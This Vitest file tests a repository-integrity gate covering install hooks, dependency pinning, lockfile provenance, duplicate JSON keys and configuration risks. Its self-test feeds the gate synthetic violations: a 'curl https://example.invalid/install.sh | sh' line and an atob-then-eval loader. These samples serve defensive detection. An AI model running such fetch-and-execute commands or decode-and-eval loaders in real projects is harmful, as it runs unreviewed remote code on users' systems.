import { execFileSync } from "node:child_process";
import { readFile } from "node:fs/promises";

import { describe, expect, it } from "vitest";

import {
  CONFIGURATION_SURFACES,
  findConfigurationViolations,
  findDuplicateJsonKeys,
  findInstallTimeHooks,
  findUndecidedInstallScripts,
  findUnpinnedDirectDependencies,
  findUnresolvedLockEntries,
} from "../../scripts/lib/repository-integrity.mjs";

const readText = async (path: string): Promise<string | undefined> => {
  try {
    return await readFile(path, "utf8");
  } catch (cause) {
    if ((cause as NodeJS.ErrnoException).code === "ENOENT") return undefined;
    throw cause;
  }
};

const readJson = async (path: string): Promise<Record<string, unknown>> =>
  JSON.parse((await readText(path)) ?? "null") as Record<string, unknown>;

const listTracked = (patterns: string[]): string[] =>
  execFileSync(
    "git",
    [
      "ls-files",
      "-z",
      "--cached",
      "--others",
      "--exclude-standard",
      "--",
      ...patterns,
    ],
    { encoding: "utf8", maxBuffer: 8 * 1024 * 1024 },
  )
    .split("\0")
    .filter((entry) => entry.length > 0)
    .sort();

describe("repository integrity", () => {
  it("declares no install-time lifecycle hook", async () => {
    const packageJson = await readJson("package.json");

    expect(
      findInstallTimeHooks(packageJson.scripts as Record<string, unknown>),
    ).toEqual([]);
  });

  it("decides every dependency install script", async () => {
    const packageJson = await readJson("package.json");
    const lockfile = await readJson("package-lock.json");

    expect(
      findUndecidedInstallScripts(lockfile.packages, packageJson.allowScripts),
    ).toEqual([]);
  });

  it("pins every direct dependency to an exact public-registry version", async () => {
    const packageJson = await readJson("package.json");

    expect(findUnpinnedDirectDependencies(packageJson)).toEqual([]);
  });

  it("resolves every locked package from the public registry with an integrity hash", async () => {
    const lockfile = await readJson("package-lock.json");

    expect(findUnresolvedLockEntries(lockfile.packages)).toEqual([]);
  });

  it("parses every tracked JSON document without a duplicate key", async () => {
    const documents = [];
    for (const path of listTracked(["*.json"])) {
      const text = await readText(path);
      if (text === undefined) continue;
      documents.push({ path, text });
    }

    expect(documents.length).toBeGreaterThan(0);
    expect(findDuplicateJsonKeys(documents)).toEqual([]);
  });

  it("keeps the executable configuration free of decoded evaluation, opaque literals, remote script execution, and unpinned actions", async () => {
    const documents = [];
    for (const surface of [
      ...CONFIGURATION_SURFACES,
      ...listTracked([
        ".github/workflows/*.yml",
        ".github/actions/*/action.yml",
      ]).map((path) => ({ path, kind: "yaml" as const })),
    ]) {
      const text = await readText(surface.path);
      if (text === undefined) continue;
      documents.push({ path: surface.path, text, kind: surface.kind });
    }

    expect(documents.length).toBeGreaterThan(0);
    expect(findConfigurationViolations(documents)).toEqual([]);
  });

  it("detects every violation it claims to detect", () => {
    // A rule that cannot fail proves nothing: each rule is exercised against a
    // synthetic violation, so the gate is known to reject what it reports.
    expect(
      findInstallTimeHooks({ postinstall: "node scripts/after-install.mjs" }),
    ).toEqual(["postinstall"]);
    expect(
      findUndecidedInstallScripts(
        {
          "node_modules/example": { version: "1.2.3", hasInstallScript: true },
          "node_modules/approved": { version: "4.5.6", hasInstallScript: true },
        },
        { "approved@4.5.6": true },
      ),
    ).toEqual(["example@1.2.3"]);
    expect(
      findUnpinnedDirectDependencies({
        dependencies: {
          pinned: "1.2.3",
          ranged: "^1.2.3",
          remote: "git+https://example.invalid/x.git",
        },
        overrides: { nested: { ranged: "~2.0.0" } },
      }),
    ).toEqual([
      "dependencies.ranged = ^1.2.3",
      "dependencies.remote = git+https://example.invalid/x.git",
      "overrides.nested = ~2.0.0",
    ]);
    expect(
      findUnresolvedLockEntries({
        "node_modules/elsewhere": {
          version: "1.0.0",
          resolved: "https://example.invalid/elsewhere-1.0.0.tgz",
          integrity: "sha512-example",
        },
        "node_modules/unhashed": {
          version: "1.0.0",
          resolved: "https://registry.npmjs.org/unhashed/-/unhashed-1.0.0.tgz",
        },
      }),
    ).toEqual([
      "node_modules/elsewhere: resolves outside https://registry.npmjs.org/",
      "node_modules/unhashed: no integrity hash",
    ]);
    expect(
      findDuplicateJsonKeys([
        { path: "example.json", text: '{"a":1,"a":2}' },
        { path: "valid.json", text: '{"a":1}' },
      ]),
    ).toEqual(['example.json: duplicate key "a"']);
    expect(
      findConfigurationViolations([
        {
          path: "config.mjs",
          text: [
            'const source = atob("payload");',
            "eval(source);",
            'const literal = "QUFB";',
            `const blob = "${"QUFB".repeat(60)}";`,
            "curl https://example.invalid/install.sh | sh",
          ].join("\n"),
        },
        {
          path: "workflow.yml",
          text: "jobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4",
        },
      ]),
    ).toEqual([
      "config.mjs:2: decoded-evaluation",
      "config.mjs:4: opaque-literal",
      "config.mjs:5: remote-script-execution",
      "workflow.yml:4: unpinned-action actions/checkout@v4",
    ]);
  });

  it("reads prose about a forbidden pattern as prose, not as the pattern", () => {
    // The installer documents its own `curl ... | bash` truncation guard in a
    // comment. A rule that matched the documentation would report the
    // documentation as the defect.
    expect(
      findConfigurationViolations([
        {
          path: "install.sh",
          kind: "shell",
          text: "# `curl ... | bash` path is guarded\nset -euo pipefail\n",
        },
      ]),
    ).toEqual([]);
  });
});
